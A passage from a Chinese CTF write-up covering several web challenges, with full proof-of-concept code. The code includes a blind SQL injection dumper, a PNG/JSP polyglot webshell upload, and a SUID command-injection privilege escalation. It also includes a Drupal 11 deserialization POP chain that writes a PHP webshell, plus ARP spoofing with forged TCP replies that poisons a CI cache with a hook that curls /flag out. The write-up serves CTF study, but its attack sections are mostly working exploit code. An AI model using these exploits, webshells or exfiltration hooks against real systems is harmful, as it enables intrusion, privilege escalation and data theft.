**附加（未用）**：登录后不轮换JSESSIONID，且接受URL里`;jsessionid=` →会话固定。

#### 后台功能面定位上传点

`/admin/flag` 、 `/admin/console` 、 `/admin/export` →404（诱饵）； `/admin/dashboard` 、 `/admin/content` 、 `/admin/media` →200。

`/admin/media` ：

```html
<p class="muted">媒体库只保存图片资源（png / jpg / jpeg / gif / bmp），单文件不超过 8MB。</p>
<form action="/admin/media/upload" method="post" enctype="multipart/form-data"
      onsubmit="return easycmsCheckImage(this)">
  <input type="file" name="file" required accept=".png,.jpg,.jpeg,.gif,.webp,.bmp,image/*"/>
</form>
```

前端JS只查扩展名；页面注释称“The server re-checks the bytes”——服务端用ImageIO校验图片字节，但不校验扩展名，且按原始filename落盘到 `/media/` 。

这里的校验逻辑是典型的“只做一半”： `ImageIO.read()` 只要能解出一张图就放行，既不看文件头魔数是否与扩展名匹配，也不重新编码，更不改名。于是只要文件的前半段是一张合法图片、后半段是任意文本，校验就能通过；而落盘时用的是原始文件名，`.jsp` 被完整保留。再叠加“ `/media/` 是静态资源目录、且没有鉴权”这一条，上传即等于写入一个可访问的脚本。反过来说，如果服务端把文件重命名为UUID、或强制改后缀为`.png` 、或把上传目录配置成不可执行，这条链就断了——防御点并不在“检测是不是图片”，而在“决定文件叫什么、放在哪、由谁来解释”。

#### 图片马getshell（未认证RCE）

##### 构造多语种文件

合法1x1 PNG+尾部JSP scriptlet（ImageIO能解析、Tomcat按`.jsp` 编译），构造脚本见 `4.2` 。

多语种文件能成立，是因为两个解析器的“视野”不同：ImageIO只按PNG规范读到 `IEND` 块就结束，后面的字节既不影响解码也不触发报错；而Tomcat的JspServlet是按扩展名判定，把整个文件当JSP源码编译，PNG二进制部分会被当作模板文本原样输出（因此响应开头是一堆乱码），真正执行的是 `<% %>` 里的Java代码。所以这个文件对ImageIO是合法图片，对Tomcat是合法JSP，两边都不会拒绝它。

##### 上传与执行

```powershell
curl -s -b cookies.txt -F 'file=@cmd.jsp;type=image/png;filename=cmd.jsp' \
  <靶机地址>
## → 302 Location: /admin/media

curl -s --get --data-urlencode 'c=id;hostname' <靶机地址>
## → uid=1001(easycms) gid=1001(easycms) groups=1001(easycms)
## *
```

`/media/cmd.jsp` 无需会话：上传文件被静态暴露，Tomcat JspServlet按扩展名编译→未认证webshell，权限 `easycms` 。

请求里显式指定 `type=image/png` 是为了让 `Content-Type` 与图片字节一致，避免服务端在“图片校验”之外再按MIME做一次拒绝； `filename=cmd.jsp` 则决定了落盘名，两者互不校验，正是绕过点所在。执行时用GET传 `c` 参数， `/bin/sh -c` 把多条命令串起来，一次请求就能拿到 `id` 、主机名和环境变量。webshell的权限是 `uid=1001(easycms)` ，这既确认了上传目录没有做降权运行，也说明到此为止只是“应用用户”，离root还差一个本地提权。

> 坑：上传目录周期性清理，故 `run.sh` 每次重传后立即请求（重试3次）。

##### 主机信息

```bash
uid=1001(easycms) hostname=*
/flag  -r-------- 1 root root 42
env: DB_HOST=<靶机地址> DB_PORT=5432 DB_NAME=easycms DB_USER=cms DB_PASS=cms_pass
     TOMCAT_VERSION=10.1.61  JAVA_VERSION=jdk-<靶机地址>
/app 不存在，cat /flag 无权限 → flag 是 root-only 的 /flag。
```

#### 本地提权：SUID easycms-restore命令注入

##### 发现

```
/usr/local/bin/easycms-restore   (SUID root)
$ easycms-restore
usage: easycms-restore <asset>
restores <asset> from the root backup set into /srv/media
```

`/var/backups/media` 是 `drwx------ root root` （easycms无权进入）； `strings` 见实现：

```
execl("/bin/bash", "-c", "exec /bin/cp -p /var/backups/media/%s /srv/media/", asset);
```

只有 `strstr(asset, "..")` → `invalid asset name` 。

##### ;cmd不行、$(...)行

`x;id` → `exec /bin/cp ... /var/backups/media/x;id /srv/media/` ：以 `exec` 开头且尾部 `/srv/media/` 干扰，实测只得到 `id: '/srv/media/': no such user` ； `x;cp /flag /srv/media/flagout` 、 `x;cat</flag` 也失败。

过滤只挡`..`，不挡 `$()` ；命令替换在bash执行 `exec cp` 之前求值，此时euid已是root。

证明euid：

```bash
$ easycms-restore 'x$(id)'
cp: cannot stat '/var/backups/media/xuid=1001(easycms)': ...
cp: cannot stat 'euid=0(root)': ...        ← 命令替换以 root 执行
```

这一步是整个提权的分水岭： `id` 的外层部分仍显示 `uid=1001` ，但 `euid` 是 `0` ，说明程序虽然以普通用户身份被调用，进程的有效用户却已经被SUID位抬到了root，且这个特权在 `bash -c` 解析命令行的阶段就已经生效。因此不需要真正的交互式shell，也不需要反弹连接——只要能让bash在 `exec cp` 之前求值一段 `$(...)` ，那段代码就是root权限。反观`;`，它只是把命令拼在 `cp` 的参数后面， `exec` 已经把进程替换成 `cp` ，后续的`;id` 根本没有机会作为独立命令执行，剩下的只是 `cp` 抱怨参数不存在。

##### 拿flag

选择 `chmod` 而不是 `cp /flag` ，是因为 `cp` 的目标目录与源权限都会引入额外变量（ `/srv/media` 是否可写、目录是否被 `cp` 当成目录处理），而 `chmod 644 /flag` 只改元数据、不移动文件，一次成功即可用普通权限 `cat` 读出；即便 `cp` 随后报错，也不影响已经执行的 `chmod` 。

```bash
$ /usr/local/bin/easycms-restore "\$(chmod 644 /flag)"
$ ls -la /flag
-rw-r--r-- 1 root root 42 /flag
$ cat /flag
flag{动态容器已脱敏}
```

（ `ERR:cp: -r not specified; omitting directory ...`是 `cp` 的正常抱怨，不影响已执行的 `chmod` 。）

### 4\. PoC

```python
import base64, re, sys
import requests

T = sys.argv[1].rstrip('/')
s = requests.Session()

def raw(q):
    r = s.get(T + '/search', params={'q': q}, timeout=10)
    m = re.search(r'<span>(\d+)</span>', r.text)
    return int(m.group(1)) if m else-1

def truth(expr):
    return raw("\'=(" + expr + ")--") == 1

def dump(expr):
    out = ''
    for i in range(200):
        lo, hi = 32, 126
        while lo < hi:
            mid = (lo + hi) // 2
            if truth("SELECT ascii(substr((%s),%d,1))<=%d" % (expr, i+1, mid)):
                hi = mid
            else:
                lo = mid + 1
        if lo == 32:
            break
        out += chr(lo)
    return out

print(dump("SELECT string_agg(username||':'||password,'|') FROM admins"))
s.post(T + '/admin/login', data={'username': 'altair', 'password': 'freedom'})

png = base64.b64decode('iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAC0lEQVR42mP8z8BQDwAEhQGAhKmMIQAAAABJRU5ErkJggg==')
jsp = b'''<%@ page import="java.io.*" %><% String c=request.getParameter("c");
if(c!=null){Process p=Runtime.getRuntime().exec(new String[]{"/bin/sh","-c",c});
BufferedReader br=new BufferedReader(new InputStreamReader(p.getInputStream()));
String l;while((l=br.readLine())!=null)out.println(l);}%>'''
s.post(T + '/admin/media/upload', files={'file': ('cmd.jsp', png+jsp, 'image/png')})
print(s.get(T + '/media/cmd.jsp', params={'c': '/usr/local/bin/easycms-restore "$(chmod 644 /flag)"; cat /flag'}).text)
```

* * *

## Web6-Crack a Little Smile

### 1\. 题目信息

| 项目  | 内容  |
| --- | --- |
| 分类  | Web |
| 形态  | 容器题（Docker） |
| 附件  | 无（题目仅提供靶机） |
| 目标  | 容器  |

Flag：flag{动态容器已脱敏}

### 2\. 题目分析

#### 站点指纹与环境

环境为 Drupal 11.4.11、PHP 8.3.36、nginx + php-fpm。首页是 Drupal 11 站点「远航星·频率观测终端」，页脚标注 `Drupal 11.4.11 · PHP 8.3` ，响应头带 `X-Generator: Drupal 11` 。

#### 功能与接口

页面围绕「观测档案」：

-   填写观测代号、观测日志、接收频段、存在状态；
    
-   点击「生成频录码」，前端调用 `POST /api/presets/export` ；
    
-   在「另一台终端」粘贴频录码，调用 `POST /api/presets/import` 恢复档案。
    

接口由 `/static/js/resonance.js` 暴露：

```javascript
var data = await postJson("/api/presets/export", currentRecord());
// ...
var data = await postJson("/api/presets/import", { code: code });
```

题目描述反复提到「保存频录码，在另一台终端重建她的存在」，频录码即 PHP `serialize()` 的结果。

#### 频录码数据格式

向 `/api/presets/export` 发送：

```json
{"codename":"test01","fieldNote":"hello world test","band":"band-01","signalProfile":"clean"}
```

返回：

```
{"ok":true,"code":"TzoyMjoiUmVzb25hbmNlQXJjaGl2ZVByZXNldCI6...","preset":{...}}
```

对 `code` 解 base64：

```css
O:<端口>:"ResonanceArchivePreset":5:{
  s:<端口>:"formatVersion";s:<端口>:"resonance-archive/1";
  s:8:"codename";s:6:"test01";
  s:9:"fieldNote";s:<端口>:"hello world test";
  s:4:"band";s:7:"band-01";
  s:<端口>:"signalProfile";s:5:"clean";
}
```

`/api/presets/import` 的流程：

1.  base64 解码；
    
2.  对解码后的字符串做 provider 检查；
    
3.  `unserialize()` ；
    
4.  `instanceof ResonanceArchivePreset` 校验；
    
5.  逐字段校验并返回。
    

#### 反序列化 sink 与错误分类

典型 PHP 对象注入 sink： `unserialize()` 不限制可实例化类， `__wakeup` / `__destruct` 在类型检查之前触发。

| 输入  | error |
| --- | --- |
| base64 损坏 | `damaged_code` |
| 顶层不是目标类 | `unsupported_preset_type` |
| 内嵌类来自被禁 provider | `unsupported_provider` |
| 缺字段 | `incomplete_preset` |
| 属性类型不对 / 解析异常 | `unreadable_preset` |
| 字段值不在允许范围 | `invalid_preset` |
| formatVersion 不对 | `unsupported_version` |

#### Drupal 11 / PHP 8.3 环境要点

-   **自动加载全程可用**： `unserialize()` 遇到 `O:` / `C:` 中的类名会触发 Composer autoloader， `web/core` 、 `web/vendor` 下的类都能实例化，可用 gadget 面等于整个代码库。
    
-   **强类型属性**：核心与题目自定义类多声明了 `string` 、 `array` 或接口类型，类型不符会在属性赋值阶段抛 `TypeError` ，这是 `unreadable_preset` 的主要来源；类型吻合时，gadget 可以塞进任何接口类型属性。
    
-   **动态属性仅弃用不致命**：PHP 8.2 起给未声明属性赋值只发 `E_DEPRECATED` ，不抛异常，因此在 `ResonanceArchivePreset` 上挂第六个属性仍能完成反序列化。
    
-   **魔术方法时机**： `__wakeup` / `__unserialize` 在对象构造完成时立即执行， `__destruct` 在对象图释放时执行，两者都早于 `instanceof` 与逐字段校验，业务层返回什么错误都不影响 gadget 执行。
    

#### 构造 Drupal 原生 POP 链

##### Sink：Container::get()

`Drupal\Component\DependencyInjection\Container::get()` 保留了运行期反序列化： `$definition = $this->serviceDefinitions[$id]` ，当 `isset($definition[0])` 成立时直接 `unserialize($definition)` ，再交给 `createService()` ；后者若拿到 `factory` 键，就用 `call_user_func_array($factory, $arguments)` 调用。因此只要控制 `serviceDefinitions[$cid]` ，就能让 `file_put_contents` 连同参数一起执行。

##### 入口：CacheCollector 与 YamlCacheCollectorDiscovery

`Drupal\Core\Cache\CacheCollector::updateCache()` 会执行 `$this->cache->get($this->getCid())` ， `cache` 、 `lock` 、 `cid` 三个属性都来自反序列化，可完全控制；前置条件用 `keysToPersist` / `storage` 满足。它不会在 `__destruct` 里自动触发，需要一座桥：

```
// Drupal\Core\Discovery\YamlCacheCollectorDiscovery
public function __destruct() {
    $this->yamlCacheCollector->destruct();
}
```

把 `yamlCacheCollector` 指向 `Drupal\Core\State\State` （继承 `CacheCollector` ）， `destruct()` 就会调 `updateCache()` ； `lock` 用 `NullLockBackend` （ `acquire()` 恒为 `TRUE` ）， `cache` 指向上面的 `Container` ，链即打通。

##### 完整调用链

```php
ResonanceArchivePreset（5 个合法字段 + 额外属性 x）
└─ Drupal\Core\Discovery\YamlCacheCollectorDiscovery::__destruct()
   └─ $yamlCacheCollector->destruct()            // Drupal\Core\State\State
      └─ CacheCollector::destruct() → updateCache()
         ├─ $this->lock->acquire()               // NullLockBackend → TRUE
         └─ $this->cache->get($cid, false)       // cache = Drupal\Component\DependencyInjection\Container
            └─ Container::get($cid)
               └─ unserialize($this->serviceDefinitions[$cid])
                  └─ createService()
                     └─ call_user_func_array($factory, $arguments)
```

链上的类名全部是 `Drupal\...`，不会命中 `Symfony` / `Guzzle` / `Doctrine` 黑名单。

`Container::get()` 的返回类型是 `?object` ，factory 返回 int（例如 `file_put_contents` 返回写入字节数）时会在返回阶段抛 `TypeError` ，但副作用已经发生。

##### 关键属性

-   `Container` ： `serviceDefinitions['qwb_cid']` 放一段序列化数组， `factory` 为 `file_put_contents` ， `arguments` 为写入路径与内容；
    
-   `State` ： `cid` 设为 `qwb_cid` ，与键名对应； `cache` 指向该 `Container` ， `lock` 为 `NullLockBackend` ； `keysToPersist` / `storage` 满足 `updateCache()` 前置条件，其余 `CacheCollector` 状态属性一并赋值；
    
-   `YamlCacheCollectorDiscovery` ： `yamlCacheCollector` 指向该 `State` 。
    

`Container::get()` 侧有三个前提：

-   `serviceDefinitions` 是 protected 数组，键必须与 `$cid` 完全一致；
    
-   值必须是字符串， `isset($definition[0])` 对非空字符串恒为真，才会进入 `unserialize()` ；
    
-   内层必须序列化成数组，因为 `createService(array $definition, $id)` 带数组类型约束， `factory` 与 `arguments` 会原样交给 `call_user_func_array()` 。
    

因此整条链是两次反序列化：外层由请求提交，内层藏在 `serviceDefinitions` 里，由 `Container` 运行期解开，payload 中会出现嵌套的 `s:<len>:"a:2:{...}"` 。

### 3\. 解题过程

#### provider 过滤

正式 `unserialize()` 之前，程序对 base64 解码后的原始字符串做子串匹配。实测：

-   类名写 `GuzzleHttp\Psr7\PumpStream` → `unsupported_provider: GuzzleHttp` ；
    
-   改成全小写 `guzzlehttp\psr7\pumpstream` → 仍被识别为 `GuzzleHttp` ；
    
-   加前导反斜杠 `\GuzzleHttp\...` → 仍被识别；
    
-   类名只出现在字符串字面量里 → 也会被拦截，说明是原始文本扫描，不是语法解析；
    
-   `C:` 自定义序列化内嵌同样会被扫到。
    

黑名单包括 `Symfony` 、 `Guzzle` 、 `GuzzleHttp` 、 `Doctrine` ； `Drupal` 、 `Twig` 、 `PEAR` 等放行。phpggc 中最顺手的 Guzzle / Symfony 链全部不可用，只能寻找 Drupal 原生链。

#### 字段类型限制与动态属性

把 `codename` 等字段换成 int、bool、null、数组或对象都会得到 `unreadable_preset` ，只有字符串能走完解析。因此 gadget 不能放进这五个字段，但可以在顶层对象上挂一个额外动态属性 `x` 携带 gadget。该属性只触发 `E_DEPRECATED` ，不会中断反序列化；业务校验会返回 `unreadable_preset` ，但此时对象已构造完成，请求结束释放对象时 `__destruct()` 照常执行。

#### vendor 侧加固

Drupal 11.4.11 在 `core/includes/guzzle_file_cookie_jar_shim.php` 中重定义了 Guzzle 的 `FileCookieJar` ：

```php
private bool $autoSave = true;

public function __wakeup(): void {
    $this->autoSave = false;
}
```

这堵住了经典 Drupal 链入口 `FileCookieJar::__destruct → save → __toString` ；同时 `GuzzleHttp\Psr7\FnStream::__wakeup()` 直接抛 `LogicException` 。两条常规入口都被封死。

#### 触发反序列化并写入 webshell

将 gadget 对象作为额外属性 `x` 拼进顶层 `ResonanceArchivePreset` ，base64 后 POST 到 `/api/presets/import` 。请求返回 `unreadable_preset` ，但对象已经反序列化完成；请求结束时对象释放， `YamlCacheCollectorDiscovery::__destruct()` 启动整条链，最终执行 `call_user_func_array('file_put_contents', [...])` ，向 `/opt/drupal/web/sites/default/files/qwb.php` 写入 webshell。

`file_put_contents` 返回写入字节数， `Container::get()` 在返回阶段抛 `TypeError` ，但文件已经落盘，异常不影响利用结果。

#### 读取 flag

Web 根目录 `/opt/drupal/web` 及其下的 `sites/default/files` 对 `www-data` 可写；服务是 nginx + php-fpm，Drupal 放在 `files/.htaccess` 里的 PHP 执行限制只对 Apache 生效，nginx 会正常解析该目录下的 `.php` 。访问：

```
http://<靶机地址>/sites/default/files/qwb.php?c=/readflag
```

webshell 先输出 `SHELLOK:`，再执行 `system('/readflag')` 。 `/flag.txt` 权限为 `400 root` ， `www-data` 无法直接读取；根目录的 `/readflag` 是 setuid root，直接执行即可输出题目 flag。响应体出现 `SHELLOK:` 与 flag 即完成闭环。

### 4\. PoC

```php
<?php
useDrupal\Component\DependencyInjection\Container;
useDrupal\Core\Discovery\YamlCacheCollectorDiscovery;
useDrupal\Core\Lock\NullLockBackend;
useDrupal\Core\State\State;

require__DIR__ . '/autoload.php';

function setProtected(object $obj, string $class, string $prop, mixed $value): void {
    $rp = new ReflectionProperty($class, $prop);
    $rp->setAccessible(TRUE);
    $rp->setValue($obj, $value);
}

$shell = '<?php echo "SHELLOK:"; echo system($_GET["c"]); ?>';

$container = (new ReflectionClass(Container::class))->newInstanceWithoutConstructor();
setProtected($container, Container::class, 'serviceDefinitions', [
    'qwb_cid' => serialize([
        'factory' => 'file_put_contents',
        'arguments' => ['/opt/drupal/web/sites/default/files/qwb.php', $shell],
    ]),
]);

$state = (new ReflectionClass(State::class))->newInstanceWithoutConstructor();
setProtected($state, State::class, 'cid', 'qwb_cid');
setProtected($state, State::class, 'cache', $container);
setProtected($state, State::class, 'lock', new NullLockBackend());
setProtected($state, State::class, 'keysToPersist', ['k' => TRUE]);
setProtected($state, State::class, 'storage', ['k' => 'v']);
setProtected($state, State::class, 'cacheCreated', NULL);
setProtected($state, State::class, 'cacheInvalidated', FALSE);
setProtected($state, State::class, 'cacheLoaded', FALSE);
setProtected($state, State::class, 'tags', []);

$discovery = (new ReflectionClass(YamlCacheCollectorDiscovery::class))->newInstanceWithoutConstructor();
setProtected($discovery, YamlCacheCollectorDiscovery::class, 'yamlCacheCollector', $state);

$base = '<靶机地址>

$payload = 'O:<端口>:"ResonanceArchivePreset":6:{'
    . 's:<端口>:"formatVersion";s:<端口>:"resonance-archive/1";'
    . 's:8:"codename";s:6:"test01";'
    . 's:9:"fieldNote";s:5:"hello";'
    . 's:4:"band";s:7:"band-01";'
    . 's:<端口>:"signalProfile";s:5:"clean";'
    . 's:1:"x";' . serialize($discovery)
    . '}';

$ch = curl_init("$base/api/presets/import");
curl_setopt_array($ch, [
    CURLOPT_POST => TRUE,
    CURLOPT_HTTPHEADER => ['Content-Type: application/json'],
    CURLOPT_POSTFIELDS => json_encode(['code' => base64_encode($payload)]),
    CURLOPT_RETURNTRANSFER => TRUE,
]);
$resp = curl_exec($ch);
curl_close($ch);
echo $resp, PHP_EOL;

echo file_get_contents("$base/sites/default/files/qwb.php?c=/readflag"), PHP_EOL;
```

* * *

## Web7-fault_web_and_fault_hash

### 1\. 题目信息

| 项目  | 内容  |
| --- | --- |
| 分类  | Web |
| 形态  | 信息题 |
| 附件  | 无   |
| 目标  | <靶机地址> |

Flag：flag{动态容器已脱敏}

### 2\. 题目分析

题目提供动态Web入口，应用后端为 `CyberStrike` 。直接访问只能看到普通页面，核心利用点不在业务功能，而在鉴权中间件、插件配置加载和同网段CI缓存信任链。

```bash
<靶机地址>
  -> 利用静态资源后缀白名单绕过/auth鉴权
  -> 写入临时wellknown配置源
  -> 服务端拉取可控base64反射内容
  -> 利用环境变量替换破坏JSON并回显配置
  -> 泄漏应用Basic Auth凭据
  -> /pty+WebSocket进入应用容器root
  -> 在内网二层发现cache与runner
  -> ARP欺骗runner，伪造成artifact cache响应
  -> 投递含restore-hook.sh的tar.gz
  -> runner解包执行并回连/flag
```

-   `/auth` 接口本应要求认证，但路径以`.js` 结尾时会命中静态资源放行逻辑。
    
-   `wellknown` 配置源允许由玩家控制，服务端会主动发起请求。
    
-   配置加载先把 `{env:VAR}` 展开成环境变量明文，再交给JSONC解析器。
    
-   解析失败时异常信息会回显展开后的完整配置文本。
    
-   获取应用的Basic凭据后，可以通过PTY和WebSocket在应用容器内以root执行代码。
    
-   runner会主动恢复一个artifact cache归档，且信任其中的 `archiveLocation` 。
    
-   应用容器具备 `CAP_NET_RAW` ，与cache、runner处于同一二层网络，可在正确网卡上做ARP欺骗和原始TCP响应注入。
    

### 3\. 解题过程

#### 3.1 认证绕过与凭据泄漏

鉴权逻辑对静态资源只做后缀判断：

```lua
if (
  path === "/" ||
  path.startsWith("/assets/") ||
  /\.(html|js|css|png|jpg|svg|ico|woff2?|ttf|webmanifest|map)$/i.test(path)
) {
  return next();
}
```

该判断不限制请求方法与API前缀。 `/auth/:providerID` 中的 `providerID` 是路径参数，只要让整条路径最终以`.js` 结尾，即可无认证调用：

```bash
PUT /auth/<URL编码后的providerID> HTTP/1.1
Host: <靶机地址>
Content-Type: application/json

{"type":"wellknown","key":"<ENV_KEY>","token":"\""}
```

加载配置时，后端把 `key` / `token` 写入进程环境变量，再访问由 `providerID` 拼出的配置源，并把响应中的 `config` 字段交给 `Config.load()` 。 `providerID` 可以是外部URL，构成SSRF式拉取； `token` 的值（一个双引号）会成为任意环境变量的值。

为了同时满足`.js` 结尾与可控JSON， `providerID` 指向一个base64反射端点：

```
providerID = https:<REFLECTOR_HOST>\base64\<BASE64>?x=<NONCE>.js
```

规范化后后端实际请求 `https://<REFLECTOR_HOST>/base64/<BASE64>?x=<NONCE>.js/.well-known/cyberstrike` ，反射端点解码 `<BASE64>` 返回，附加路径落在query中不影响内容。 `<BASE64>` 解码为：

```json
{
  "config": {
    "username": "<MARK_US>{env:CYBERSTRIKE_SERVER_USERNAME}<MARK_UE>",
    "password": "<MARK_PS>{env:CYBERSTRIKE_SERVER_PASSWORD}<MARK_PE>",
    "bad": "{env:<ENV_KEY>}",
    "_pad": 0
  }
}
```

环境变量先展开、后解析， `bad` 展开成孤立的双引号使JSON非法，异常信息回显展开后的完整文本；username/password 两侧的marker可直接截取。base64结果不能含 `+` 和 `/` （会被HTTP路径拆分），通过递增 `_pad` 直到编码只含路径安全字符。

写入后请求根路径触发 `Config.get()` ，并用`./` 与`.//` 的64位随机组合拼接 `directory` ，所有组合归一化到同一临时目录但字符串不同，可避开配置与实例缓存：

```
GET /?directory=<64段./与.//组合> HTTP/1.1
Host: <靶机地址>
```

从回显中取出凭据后转成Basic头，请求 `/global/health` 确认 `healthy` 为真即完成第一阶段。

#### 3.2 PTY进入应用容器

`/pty` 接口以Basic凭据鉴权，直接创建Python进程作为命令执行入口：

```bash
POST /pty?directory=<REMOTE_TEMP_DIR> HTTP/1.1
Authorization: Basic <BASE64_USER_PASS>
Content-Type: application/json

{"command":"python3","args":["-u","-c","<BOOTSTRAP>"],"cwd":".","title":"probe"}
```

响应返回 `id` 。随后连接 `ws(s)://<ENTRY_AUTHORITY>/pty/<PTY_ID>/connect?directory=<REMOTE_TEMP_DIR>` ，发送分片。

`BOOTSTRAP` 关闭PTY回显，从stdin逐行读取base64分片，遇到 `__INPUT_DONE__` 后zlib解压并 `exec` 远程阶段代码。应用容器原本以root运行且保留 `CAP_NET_RAW` ，远程阶段可直接构造二层帧。若命令立即退出，WebSocket握手可能尚未完成而连接失败，bootstrap需保持进程存活到收发结束。

#### 3.3 内网侦察与网卡选择

进入容器后先用UDP `connect()` 让内核选出到达cache的源IP，该调用不实际发包：

```
probe = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
probe.connect((CACHE_IP, CACHE_PORT))
app_ip = probe.getsockname()[0]
probe.close()
```

遍历 `socket.if_nameindex()` ，用 `ioctl(SIOCGIFADDR, 0x8915)` 找到持有 `app_ip` 的接口，再从 `/sys/class/net/<iface>/address` 读取MAC。默认路由所在接口不一定连接cache与runner，ARP欺骗必须绑定到实际业务网卡；cache与runner的MAC通过原始ARP请求解析。

侦察结论：

-   应用容器：root，具备 `CAP_NET_RAW` ，至少一个业务接口。
    
-   缓存服务：GitHub Actions artifact cache风格接口，直接访问返回未授权。
    
-   runner服务：只有有限健康检查，任务协议不需要攻击。
    
-   filehub：仅静态首页，属于诱饵。
    
-   应用容器内没有部署脚本、Docker socket或共享卷。
    

突破口因此不是runner的HTTP API，而是runner后续自动执行的缓存恢复流程。

#### 3.4 artifact cache投毒

runner先查询缓存并自带token：

```
GET /_apis/artifactcache/cache?keys=<CACHE_KEY>&version=<VERSION> HTTP/1.1
Authorization: Bearer <RUNNER_TOKEN>
```

命中响应中的 `archiveLocation` 指向下载地址，runner随后下载tar.gz并在恢复阶段执行归档根目录的 `restore-hook.sh` 。攻击者无需破解token：向runner持续发送 `<CACHE_IP> is-at <APP_MAC>` 的ARP回复后，runner发往cache的帧进入应用网卡，直接应答其已带token的请求即可。

ARP只针对runner，其他帧转发给真实cache MAC，结束后向runner恢复真实缓存MAC，避免网络中断。TCP响应从请求帧中取 `client_seq=TCP.seq` 、 `server_seq=TCP.ack` ，确认号为 `client_seq+len(HTTP_PAYLOAD)` ，源IP/端口为cache侧、目的为runner侧，flags为 `PSH|ACK` ，重算IP首部与TCP伪首部校验和，并带 `Content-Length` 与 `Connection: close` ；后者让lookup连接结束，下载请求改用新源端口，便于识别。

归档只含一个可执行的 `restore-hook.sh` ，读取runner容器中的 `/flag` 并POST到应用容器的临时回调端口，不可读时回传诊断：

```bash
#!/bin/sh
P=/tmp/p.$$
if [ -r /flag ]; then cat /flag > "$P"; U=/flag; else id > "$P" 2>&1; U=/diag; fi
curl -sS -m 8 -X POST --data-binary @"$P" "http://<APP_IP>:<CALLBACK_PORT>$U"
```

回调端对收到的数据先 `strip()` 再计算摘要，因为flag文件通常带末尾换行，直接对原始字节取 `sha256` 会与平台下发的哈希不一致：

```
clean = data.strip()
digest = hashlib.sha256(clean).hexdigest()
```

### 4\. PoC

```python
import base64, hashlib, json, secrets, socket, struct, sys, zlib
from urllib.parse import quote
import requests, websocket

ENTRY = "<靶机地址>"
REFLECTOR = sys.argv[2]
BOOTSTRAP = (
    "import base64,sys,termios,zlib\n"
    "fd=sys.stdin.fileno();a=termios.tcgetattr(fd);a[3]&=~termios.ECHO\n"
    "termios.tcsetattr(fd,termios.TCSANOW,a);c=[]\n"
    "while True:\n"
    " l=sys.stdin.readline().strip()\n"
    " if l=='__INPUT_DONE__':break\n"
    " c.append(l)\n"
    "exec(compile(zlib.decompress(base64.b64decode(''.join(c))),'<s>','exec'))\n")

def checksum(data):
    if len(data) & 1: data += b"\x00"
    total = sum(struct.unpack("!%dH" % (len(data) // 2), data))
    while total >> 16: total = (total & 0xFFFF) + (total >> 16)
    return (~total) & 0xFFFF

def arp_reply(raw, app_mac, cache_ip, runner_mac, runner_ip):
    body = struct.pack("!HHBBH", 1, 0x0800, 6, 4, 2) + app_mac + socket.inet_aton(cache_ip)
    raw.send(runner_mac + app_mac + b"\x08\x06" + body + runner_mac + socket.inet_aton(runner_ip))

def tcp_reply(frame, tcp_off, req_len, body, cache_ip, cache_port, runner_ip, app_mac, runner_mac):
    src_port = struct.unpack_from("!H", frame, tcp_off)[0]
    client_seq, server_seq = struct.unpack_from("!II", frame, tcp_off + 4)
    http = (b"HTTP/1.1 200 OK\r\nContent-Length: " + str(len(body)).encode()
            + b"\r\nConnection: close\r\n\r\n" + body)
    ip = struct.pack("!BBHHHBBH4s4s", 0x45, 0, 40 + len(http), 0, 0x4000, 64, 6, 0,
                     socket.inet_aton(cache_ip), socket.inet_aton(runner_ip))
    ip = ip[:10] + struct.pack("!H", checksum(ip)) + ip[12:]
    tcp = struct.pack("!HHIIBBHHH", cache_port, src_port, server_seq,
                      (client_seq + req_len) & 0xFFFFFFFF, 5 << 4, 0x18, 65535, 0, 0)
    pseudo = (socket.inet_aton(cache_ip) + socket.inet_aton(runner_ip)
              + struct.pack("!BBH", 0, 6, len(tcp) + len(http)))
    tcp = tcp[:16] + struct.pack("!H", checksum(pseudo + tcp + http)) + tcp[18:]
    return runner_mac + app_mac + b"\x08\x00" + ip + tcp + http

def leak_credentials():
    nonce = secrets.token_hex(8)
    env_key = "PARSE_BREAK_" + nonce.upper()
    marks = ["__M_%s_%d__" % (nonce, i) for i in range(4)]
    config = {
        "username": marks[0] + "{env:CYBERSTRIKE_SERVER_USERNAME}" + marks[1],
        "password": marks[2] + "{env:CYBERSTRIKE_SERVER_PASSWORD}" + marks[3],
        "bad": "{env:" + env_key + "}",
        "_pad": 0,
    }
    for pad in range(10000):
        config["_pad"] = pad
        blob = base64.b64encode(json.dumps({"config": config}, separators=(",", ":")).encode()).decode()
        if"+"notin blob and"/"notin blob: break
    else:
        raise RuntimeError("no path-safe base64")
    auth = ENTRY + "/auth/" + quote("https:%s\\base64\\%s?x=%s.js" % (REFLECTOR, blob, nonce), safe="")
    requests.put(auth, json={"type": "wellknown", "key": env_key, "token": '"'}, timeout=20)
    bits = format(int(nonce, 16), "064b")
    directory = "/tmp/" + "".join("./"if b == "1"else".//"for b in bits)
    text = requests.get(ENTRY + "/?directory=" + quote(directory, safe=""), timeout=20).text
    requests.delete(auth, timeout=20)
    return (text.split(marks[0], 1)[1].split(marks[1], 1)[0],
            text.split(marks[2], 1)[1].split(marks[3], 1)[0])

def spawn_pty(credentials, remote_source, directory):
    token = base64.b64encode(("%s:%s" % credentials).encode()).decode()
    auth = {"Authorization": "Basic " + token}
    body = {"command": "python3", "args": ["-u", "-c", BOOTSTRAP], "cwd": ".", "title": "probe"}
    pty_id = requests.post(ENTRY + "/pty", params={"directory": directory},
                           headers=auth, json=body, timeout=20).json()["id"]
    ws = websocket.create_connection(
        ENTRY.replace("http", "ws", 1) + "/pty/" + quote(pty_id, safe="")
        + "/connect?directory=" + quote(directory, safe=""), header=list(auth.items()), timeout=30)
    blob = base64.b64encode(zlib.compress(remote_source.encode(), 9)).decode()
    for i in range(0, len(blob), 1000):
        ws.send(blob[i:i + 1000] + "\n")
    ws.send("__INPUT_DONE__\n")
    chunk = b""
    whilenot chunk or ("__STAGE_DONE__"notin chunk and"__STAGE_FATAL__"notin chunk):
        chunk = ws.recv()
    ws.close()
```

* * *

## Web8-vaultlink

### 1\. 题目信息

| 项目  | 内容  |
| --- | --- |
| 分类  | Web |
| 形态  | 容器（Docker，需初始化） |
| 附件  | 无   |
| 目标  | 容器  |

Flag：flag{动态容器已脱敏}

### 2\. 题目分析

#### 网关路由与唯一入口

容器只暴露一个合作方网关端口，对外可见的路由很少：

| 路由  | 作用  |
| --- | --- |
| `GET /` | 合作方门户首页，HTML注释里有staging假flag |
| `GET /docs` | 网关接口说明 |
| `GET /api/proxy?url=<upstream-url>` | 反向代理，按合作方身份代取上游资源 |
